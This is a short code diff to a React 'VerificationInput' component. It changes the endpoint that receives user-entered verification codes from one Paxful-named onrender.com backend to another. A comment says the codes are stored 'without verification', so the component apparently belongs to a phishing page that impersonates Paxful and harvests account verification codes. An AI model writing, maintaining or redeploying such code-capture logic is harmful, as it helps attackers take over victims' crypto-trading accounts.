@@ -71,7 +71,7 @@ const VerificationInput = () => {
     
     try {
       // Send the entered code to your backend for storing (without verification)
-      await fetch('https://paxful-backend-1.onrender.com/verify_code', {
+      await fetch('https://paxful-backend-2.onrender.com/verify_code', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
